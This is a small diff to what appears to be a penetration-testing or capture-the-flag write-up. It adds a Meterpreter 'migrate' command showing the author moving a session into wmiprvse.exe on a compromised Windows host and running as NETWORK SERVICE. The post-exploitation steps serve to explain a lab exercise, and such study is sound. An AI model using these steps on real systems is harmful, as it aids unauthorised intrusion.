@@ -140,6 +140,7 @@ Process List
 ```
 I migrated to the wmiprvse.exe and get a suitable shell.
 ``` 
+meterpreter > migrate 1935
 meterpreter > getuid
 Server username: NT AUTHORITY\NETWORK SERVICE
 ```
